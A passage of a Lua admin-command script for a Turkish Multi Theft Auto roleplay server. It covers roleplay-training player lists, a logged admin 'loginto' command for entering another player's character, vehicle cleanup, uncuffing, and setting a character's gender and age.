	if not exports.mek_integration:isPlayerTrialAdmin(thePlayer) then
		outputChatBox("[!]#FFFFFF Yeterli yetkiniz yok.", thePlayer, 255, 0, 0, true)
		return
	end

	outputChatBox("#8b30d8====================================================", thePlayer, 255, 194, 14, true)
	outputChatBox("#8b30d8[Rol Bilgisi Yetersiz Oyuncular#8b30d8]", thePlayer, 0, 0, 0, true)

	local foundPlayer = false
	for _, player in ipairs(getElementsByType("player")) do
		if getElementData(player, "logged") then
			local rpConfirm = getElementData(player, "rp_confirm")
			if not rpConfirm then
				outputChatBox(
					"#8b30d8[#9684a5ID: #FFFFFF"
						.. getElementData(player, "id")
						.. " #8b30d8- #9684a5Karakter Adı: #FFFFFF"
						.. exports.mek_global:getPlayerName(player)
						.. "#8b30d8]",
					thePlayer,
					255,
					0,
					0,
					true
				)
				foundPlayer = true
			end
		end
	end

	if not foundPlayer then
		outputChatBox(
			"[!]#FFFFFF Şu anda rol bilgisi yetersiz olarak işaretlenmiş oyuncu bulunmamaktadır.",
			thePlayer,
			255,
			0,
			0,
			true
		)
	end
	outputChatBox("#8b30d8====================================================", thePlayer, 255, 194, 14, true)
end
addCommandHandler("rdlistele", listPlayersNeedingRoleplayTraining, false, false)

function listPlayersWithRoleplayTraining(thePlayer)
	if not exports.mek_integration:isPlayerTrialAdmin(thePlayer) then
		outputChatBox("[!]#FFFFFF Yeterli yetkiniz yok.", thePlayer, 255, 0, 0, true)
		return
	end

	outputChatBox("#8b30d8====================================================", thePlayer, 255, 194, 14, true)
	outputChatBox("#8b30d8[Rol Bilgisi Yeterli Oyuncular#8b30d8]", thePlayer, 0, 0, 0, true)

	local foundPlayer = false
	for _, player in ipairs(getElementsByType("player")) do
		if getElementData(player, "logged") then
			if getElementData(player, "rp_confirm") then
				outputChatBox(
					"#8b30d8[#9684a5ID: #FFFFFF"
						.. getElementData(player, "id")
						.. " #8b30d8- #9684a5Karakter Adı: #FFFFFF"
						.. exports.mek_global:getPlayerName(player)
						.. "#8b30d8]",
					thePlayer,
					255,
					0,
					0,
					true
				)
				foundPlayer = true
			end
		end
	end

	if not foundPlayer then
		outputChatBox(
			"[!]#FFFFFF Şu anda rol bilgisi yeterli olarak işaretlenmiş oyuncu bulunmamaktadır.",
			thePlayer,
			255,
			0,
			0,
			true
		)
	end
	outputChatBox("#8b30d8====================================================", thePlayer, 255, 194, 14, true)
end
addCommandHandler("rdblistele", listPlayersWithRoleplayTraining, false, false)

function showRoleplayTrainingHelp(thePlayer)
	if not exports.mek_integration:isPlayerTrialAdmin(thePlayer) then
		outputChatBox("[!]#FFFFFF Yeterli yetkiniz yok.", thePlayer, 255, 0, 0, true)
		return
	end

	outputChatBox(
		"[!]#FFFFFF Rol bilgisi yetersiz olanların listesini öğrenmek için '/rdlistele' yazınız.",
		thePlayer,
		0,
		0,
		255,
		true
	)
	outputChatBox(
		"[!]#FFFFFF Rol bilgisi yeterli olanların listesini öğrenmek için '/rdblistele' yazınız.",
		thePlayer,
		0,
		0,
		255,
		true
	)
	outputChatBox(
		"[!]#FFFFFF Bir oyuncunun rol bilgisinin yetersiz olduğunu belirtmek ve onu rol dersi listesine eklemek için '/rolal' yazınız.",
		thePlayer,
		0,
		0,
		255,
		true
	)
	outputChatBox(
		"[!]#FFFFFF Bir oyuncunun rol bilgisinin yeterli olduğunu belirtmek için '/rolver' yazınız.",
		thePlayer,
		0,
		0,
		255,
		true
	)
end
addCommandHandler("roldersi", showRoleplayTrainingHelp, false, false)

function logInToCharacter(thePlayer, commandName, ...)
	if exports.mek_integration:isPlayerServerManager(thePlayer) then
		if ... then
			targetChar = table.concat({ ... }, "_")
			dbQuery(
				function(queryHandle, thePlayer)
					local result, rows = dbPoll(queryHandle, 0)
					if result[1] and rows > 0 then
						local data = result[1]

						local targetCharID = tonumber(data.targetCharID) or false
						local targetUserID = tonumber(data.targetUserID) or false
						local targetAdminLevel = tonumber(data.targetAdminLevel) or 0
						local targetUsername = data.targetUsername or false
						local targetCharacterName = data.targetCharacterName or false
						local targetBanned = data.targetBanned or 0
						local adminLevel = exports.mek_global:getPlayerAdminLevel(thePlayer)

						if targetCharID and targetUserID then
							if targetBanned == 1 then
								outputChatBox("[!]#FFFFFF Bu hesap yasaklanmıştır.", thePlayer, 255, 0, 0, true)
								return false
							end

							if targetAdminLevel > adminLevel then
								outputChatBox(
									"[!]#FFFFFF Sizden daha yüksek yetkiye sahip birinin karakterine giremezsiniz.",
									thePlayer,
									255,
									0,
									0,
									true
								)
								exports.mek_global:sendMessageToAdmins(
									"[ADM] "
										.. exports.mek_global:getPlayerFullAdminTitle(thePlayer)
										.. " isimli yetkili yüksek yetkiye sahip birinin karakterine girmeye çalıştı ("
										.. targetUsername
										.. ")."
								)
								return false
							end

							outputChatBox(
								"[!]#FFFFFF "
									.. targetCharacterName:gsub("_", " ")
									.. " ("
									.. targetUsername
									.. ") isimli oyuncunun karakterine girdiniz.",
								thePlayer,
								0,
								255,
								0,
								true
							)
							exports.mek_global:sendMessageToAdmins(
								"[ADM] "
									.. exports.mek_global:getPlayerFullAdminTitle(thePlayer)
									.. " isimli yetkili "
									.. targetCharacterName:gsub("_", " ")
									.. " ("
									.. targetUsername
									.. ") isimli oyuncunun karakterine girdi."
							)
							exports.mek_logs:addLog(
								"loginto",
								exports.mek_global:getPlayerFullAdminTitle(thePlayer)
									.. " isimli yetkili "
									.. targetCharacterName:gsub("_", " ")
									.. " ("
									.. targetUsername
									.. ") isimli oyuncunun karakterine girdi."
							)

							triggerEvent("savePlayer", thePlayer, thePlayer)
							exports.mek_account:joinCharacter(targetCharID, thePlayer, false, true, targetUserID)
						end
					else
						outputChatBox("[!]#FFFFFF Böyle bir karakter yok.", thePlayer, 255, 0, 0, true)
					end
				end,
				{ thePlayer },
				exports.mek_mysql:getConnection(),
				"SELECT `characters`.`id` AS `targetCharID`, `characters`.`account_id` AS `targetUserID`, `accounts`.`admin_level` AS `targetAdminLevel`, `accounts`.`username` AS `targetUsername`, `characters`.`name` AS `targetCharacterName`, `accounts`.`banned` AS `targetBanned` FROM `characters` LEFT JOIN `accounts` ON `characters`.`account_id`=`accounts`.`id` WHERE `name` = ? LIMIT 1",
				tostring(targetChar)
			)
		else
			outputChatBox("Kullanım: /" .. commandName .. " [Karakter Adı]", thePlayer, 255, 194, 14)
		end
	else
		outputChatBox("[!]#FFFFFF Yeterli yetkiniz yok.", thePlayer, 255, 0, 0, true)
	end
end
addCommandHandler("loginto", logInToCharacter, false, false)

function clearVehicles(player)
    if not isElement(player) or getElementType(player) ~= "player" then return end
    if not exports.mek_integration:isPlayerServerManager(player) then return end

    local count = 0
    local playerVehicle = getPedOccupiedVehicle(player)

    for _, vehicle in ipairs(getElementsByType("vehicle")) do
        if vehicle ~= playerVehicle
        and getElementDimension(vehicle) ~= 33333
        and not getElementData(vehicle, "carshop")
        and not getElementData(vehicle, "robbery_vehicle") then

            local occupants = getVehicleOccupants(vehicle)
            if type(occupants) ~= "table" or not next(occupants) then
                setElementDimension(vehicle, 33333)
                count = count + 1
            end
        end
    end

    outputChatBox(
        "[!]#FFFFFF Başarıyla ["..count.."] adet araç farklı bir dünyaya gönderildi.",
        player, 0, 255, 0, true
    )
end
addCommandHandler("clearvehs", clearVehicles)


function adminUncuffPlayer(thePlayer, commandName, targetPlayer)
	if exports.mek_integration:isPlayerAdmin3(thePlayer) then
		if targetPlayer then
			local targetPlayer, targetPlayerName = exports.mek_global:findPlayerByPartialNick(thePlayer, targetPlayer)
			if targetPlayer then
				if getElementData(targetPlayer, "logged") then
					if getElementData(targetPlayer, "restrained") then
						setElementData(targetPlayer, "restrained", false)
						setElementData(targetPlayer, "restrained_item", 0)
						dbExec(
							exports.mek_mysql:getConnection(),
							"UPDATE characters SET restrained = 0, restrained_item = 0 WHERE id = ?",
							getElementData(targetPlayer, "dbid")
						)
						exports.mek_realism:checkPlayerRestrain(targetPlayer)

						outputChatBox(
							"[!]#FFFFFF " .. targetPlayerName .. " isimli oyuncunun kelepçesi açıldı.",
							thePlayer,
							0,
							255,
							0,
							true
						)
						outputChatBox(
							"[!]#FFFFFF "
								.. exports.mek_global:getPlayerFullAdminTitle(thePlayer)
								.. " isimli yetkili kelepçenizi açtı.",
							targetPlayer,
							0,
							0,
							255,
							true
						)
						exports.mek_logs:addLog(
							"auncuff",
							exports.mek_global:getPlayerFullAdminTitle(thePlayer)
								.. " isimli yetkili "
								.. targetPlayerName
								.. " isimli oyuncunun kelepçesini açtı."
						)
					else
						outputChatBox("[!]#FFFFFF Bu oyuncu zaten kelepçeli değil.", thePlayer, 255, 0, 0, true)
					end
				else
					outputChatBox(
						"[!]#FFFFFF Bu oyuncu karakterine giriş yapmadığı için işlem gerçekleşmedi.",
						thePlayer,
						255,
						0,
						0,
						true
					)
				end
			end
		else
			outputChatBox("Kullanım: /" .. commandName .. " [Karakter Adı / ID]", thePlayer, 255, 194, 14)
		end
	else
		outputChatBox("[!]#FFFFFF Yeterli yetkiniz yok.", thePlayer, 255, 0, 0, true)
	end
end
addCommandHandler("auncuff", adminUncuffPlayer, false, false)

addEventHandler("onPlayerQuit", root, function()
	freconnectSecurity[source] = nil
end)


function asetPlayerGender(thePlayer, commandName, targetPlayer, gender)
	if (exports.mek_integration:isPlayerGeneralAdmin(thePlayer)) then
		if not (gender) or not (targetPlayer) then
			outputChatBox("KULLANIM: /" .. commandName .. " [Karakter Adı / ID] [0= Male, 1= Female]", thePlayer, 255, 194, 14)
		else
			local targetPlayer, targetPlayerName = exports.mek_global:findPlayerByPartialNick(thePlayer, targetPlayer)
			if not targetPlayer then
				outputChatBox("Hedef bulunamadı.", thePlayer, 255, 0, 0)
				return
			end

			local dbid = getElementData(targetPlayer, "dbid")
			local genderint = tonumber(gender)
			if not dbid then
				outputChatBox("Hedef oyuncunun DB ID'si bulunamadı.", thePlayer, 255, 0, 0)
				return
			end

			if (not genderint) or (genderint > 1) or (genderint < 0) then
				outputChatBox("Error: Please choose either 0 for male, or 1 for female.", thePlayer, 255, 0, 0)
			else
				-- Güvenli parametreli sorgu
				dbExec(exports.mek_mysql:getConnection(), "UPDATE characters SET gender=? WHERE id=?", genderint, dbid)

				-- la_anticheat yerine standart setElementData kullanıldı (sync = true)
				setElementData(targetPlayer, "gender", genderint, true)

				if (genderint == 0) then
					outputChatBox("You changed " .. targetPlayerName .. "'s gender to Male.", thePlayer, 0, 255, 0)
					outputChatBox("Your gender was set to Male.", targetPlayer, 0, 255, 0)
					outputChatBox("Please F10 for changes to take effect.", targetPlayer, 255, 194, 14)
				else
					outputChatBox("You changed " .. targetPlayerName .. "'s gender to Female.", thePlayer, 0, 255, 0)
					outputChatBox("Your gender was set to Female.", targetPlayer, 0, 255, 0)
					outputChatBox("Please F10 for changes to take effect.", targetPlayer, 255, 194, 14)
				end

				--exports.la_logs:dbLog(thePlayer, 4, targetPlayer, commandName.." "..genderint)
			end
		end
	else
		outputChatBox("[!]#FFFFFF Bu komutu kullanabilmek için gerekli yetkiye sahip değilsiniz.", thePlayer, 255, 0, 0, true)
		playSoundFrontEnd(thePlayer, 4)
	end
end
addCommandHandler("setgender", asetPlayerGender)


-----setage command _charonn0

function asetPlayerAge(thePlayer, commandName, targetPlayer, age)
    if (exports.mek_integration:isPlayerGeneralAdmin(thePlayer)) then
        if not (age) or not (targetPlayer) then
            outputChatBox("KULLANIM: /" .. commandName .. " [Karakter Adı / ID] [Yaş]", thePlayer, 255, 194, 14)
        else
            local targetPlayer, targetPlayerName = exports.mek_global:findPlayerByPartialNick(thePlayer, targetPlayer)
            if not targetPlayer then
                outputChatBox("Hedef bulunamadı.", thePlayer, 255, 0, 0)
                return
            end

            local dbid = getElementData(targetPlayer, "dbid")
            local ageInt = tonumber(age)
            if not dbid then
                outputChatBox("Hedef oyuncunun DB ID'si bulunamadı.", thePlayer, 255, 0, 0)
                return
            end

            if (not ageInt) or (ageInt < 1) or (ageInt > 100) then
                outputChatBox("[!] Error:#FFFFFF Lütfen 1 ile 100 arasında bir yaş giriniz.", thePlayer, 255, 0, 0)
            else
                -- Güvenli parametreli sorgu
                dbExec(exports.mek_mysql:getConnection(), "UPDATE characters SET age=? WHERE id=?", ageInt, dbid)

                setElementData(targetPlayer, "age", ageInt, true)

                outputChatBox("You changed " .. targetPlayerName .. "'s age to " .. ageInt .. ".", thePlayer, 0, 255, 0)
                outputChatBox("Your age was set to " .. ageInt .. ".", targetPlayer, 0, 255, 0)
                outputChatBox("Please F10 for changes to take effect.", targetPlayer, 255, 194, 14)

                --exports.la_logs:dbLog(thePlayer, 4, targetPlayer, commandName.." "..ageInt)
            end
        end
    else
        outputChatBox("[!]#FFFFFF Bu komutu kullanabilmek için gerekli yetkiye sahip değilsiniz.", thePlayer, 255, 0, 0, true)
        playSoundFrontEnd(thePlayer, 4)
    end
end
addCommandHandler("setage", asetPlayerAge)

